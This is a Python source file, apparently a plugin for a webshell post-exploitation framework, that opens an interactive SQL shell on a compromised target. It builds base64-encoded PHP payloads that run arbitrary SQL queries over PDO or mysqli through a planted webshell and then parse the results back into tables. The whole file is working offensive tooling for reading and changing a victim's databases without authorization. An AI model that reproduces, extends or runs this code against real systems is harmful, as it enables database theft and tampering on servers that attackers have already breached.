from re import match
from os import urandom
from prettytable import PrettyTable

from libs.app import readline
from libs.config import alias, color, gget, gset, set_namespace
from libs.myapp import base64_encode, send
from webshell_plugins.db_init import get_connect_code
from webshell_plugins.db_use import get_php as check_database

NEW_SQL_WORDLIST = {"common_wordlist": (
    "use",
    "select",
    "from",
    "binary",
    "where",
    "update",
    "insert",
    "delete",
    "show",
    "databases",
    "tables",
    "create",
    "drop",
    "grant",
    "load_file",
    "desc",
    "alter",
    "set",
    "prepare",
    "execute",
)}


def get_php(command, database, ruid, fuid):
    connect_type = gget("db_connect_type", "webshell")
    connect_code = get_connect_code(dbname=database)
    command = base64_encode(command)
    if (connect_type == "pdo"):
        return """try{%s
$r=$con->query(base64_decode('%s'));
$rows=$r->fetchAll(PDO::FETCH_ASSOC);
foreach($rows[0] as $k=>$v){
    echo "$k%s";
}
echo "%s";
foreach($rows as $array){foreach($array as $k=>$v){echo "$v%s";};echo "%s";}
} catch (PDOException $e){
die("Connect error: ". $e->getMessage());
}""" % (connect_code, command, fuid, ruid, fuid, ruid)
    elif (connect_type == "mysqli"):
        return """%s
$r=$con->query(base64_decode('%s'));
$rows=$r->fetch_all(MYSQLI_ASSOC);
foreach($rows[0] as $k=>$v){
    echo "$k%s";
}
echo "%s";
foreach($rows as $array){foreach($array as $k=>$v){echo "$v%s";};echo "%s";}""" % (connect_code, command, fuid, ruid, fuid, ruid)
    else:
        return ""


def execute_sql_command(command, database, raw_result: bool = False):
    ruid = "".join(hex(each)[2:].zfill(2) for each in urandom(16))
    fuid = "," + "".join(hex(each)[2:].zfill(2)
                         for each in urandom(12))
    res = send(get_php(command, database, ruid, fuid))
    if (not res):
        return ''
    rows = res.r_text.strip().split(ruid)
    if (raw_result):
        raw = []
        for row in rows:
            raw.append([r.strip() for r in row.split(fuid)[:-1]])
        return raw
    elif (len(rows) > 1):
        info = rows[0].split(fuid)[:-1]
        form = PrettyTable(info)
        for row in rows[1:]:
            data = [r.strip() for r in row.split(fuid)[:-1]]
            if(data):
                form.add_row(data)
        return form
    return ''


@alias()
def run():
    """
    db_shell

    Get a temporary sql shell of target system.
    """
    if (not gget("db_connected", "webshell")):
        print(color.red("Please run db_init command first"))
        return
    print(color.cyan(
        "Eenter interactive temporary sql shell...\n\nUse 'back' command to return doughnuts.\n"))
    database = gget("db_dbname", "webshell")
    prompt = "mysql (%s) > "
    set_namespace("webshell", False, True)
    wordlist = gget("webshell.wordlist")
    readline.set_wordlist(NEW_SQL_WORDLIST)
    try:
        while gget("loop"):
            print(prompt % color.cyan(database), end="")
            command = readline()
            lower_command = command.lower()
            if (lower_command.lower() in ['exit', 'quit', 'back']):
                print()
                break
            if (command == ''):
                print()
                continue
            if (lower_command.startswith("use ") and len(lower_command) > 4):
                try:
                    temp_database = match(
                        "use ([^;]*);?", lower_command).group(1)
                    res = send(check_database(temp_database))
                    if ("Connect error" in res.r_text):
                        print("\n" + color.red(res.r_text.strip()) + "\n")
                    else:
                        database = temp_database
                        print(
                            "\n" + color.green(f"Change current database: {database}") + "\n")
                except (IndexError, AttributeError):
                    print("\n" + color.red("SQL syntax error") + "\n")
            else:
                form = execute_sql_command(command, database)
                if (form == ''):
                    print(
                        f"\n{color.green('No result')} / {color.red('Connection Error')} / {color.red('SQL syntax error')}\n")
                else:
                    print(execute_sql_command(command, database))
    finally:
        gset("db_dbname", database, True, "webshell")
        readline.set_wordlist(wordlist)
